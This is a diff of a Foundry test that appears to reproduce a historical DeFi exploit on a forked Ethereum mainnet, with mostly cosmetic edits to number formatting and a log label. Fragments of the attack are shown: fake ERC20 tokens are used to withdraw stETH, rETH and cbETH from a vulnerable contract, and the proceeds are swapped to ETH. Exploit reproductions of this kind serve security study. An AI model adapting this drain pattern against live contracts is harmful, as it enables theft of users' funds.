@@ -100,7 +100,7 @@ contract ASTTest is Test {
     IuniswapV3 cbETHPool = IuniswapV3(0x840DEEef2f115Cf50DA625F7368C24af6fE74410);
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     function setUp() public {
-        cheats.createSelectFork("https://rpc.ankr.com/eth", 18448167);
+        cheats.createSelectFork("https://rpc.ankr.com/eth", 18_448_167);
     }
     function testExpolit()public{
         deal(address(this), 0);
@@ -108,7 +108,7 @@ contract ASTTest is Test {
         MyERC20 MyToken1 = new MyERC20();
         MyToken1.setStakedTokenAddress(address(stETH));
         MyToken1.setScaledBalanceToBalance(stETH_bal);
-        MyToken1.mint(10000 * 1e18);
+        MyToken1.mint(10_000 * 1e18);
         MyToken1.approve(address(vulnerable),type(uint).max);
 
         vulnerable.withdraw(address(MyToken1), stETH_bal);
@@ -135,13 +135,13 @@ contract ASTTest is Test {
 
         vulnerable.withdraw(address(MyToken3), cbETH_bal);
         vulnerable.claim(2);
-        emit log_named_decimal_uint("rETH attacker bal:",cbETH.balanceOf(address(this)),cbETH.decimals());
+        emit log_named_decimal_uint("cbETH attacker bal:",cbETH.balanceOf(address(this)),cbETH.decimals());
         stETH.approve(address(LidoCurvePool),type(uint).max);
         LidoCurvePool.exchange(1,0,stETH_bal,0);
         rETH.approve(address(rETHPool),type(uint).max);
         cbETH.approve(address(cbETHPool),type(uint).max);
-        rETHPool.swap(address(this),true,int256(rETH_bal),4295128740,new bytes(0));
-        cbETHPool.swap(address(this),true,int256(cbETH_bal),4295128740,new bytes(0));
+        rETHPool.swap(address(this),true,int256(rETH_bal),4_295_128_740,new bytes(0));
+        cbETHPool.swap(address(this),true,int256(cbETH_bal),4_295_128_740,new bytes(0));
         WETH.withdraw(WETH.balanceOf(address(this)));
         emit log_named_decimal_uint("ETH bal:",address(this).balance, 18);
 
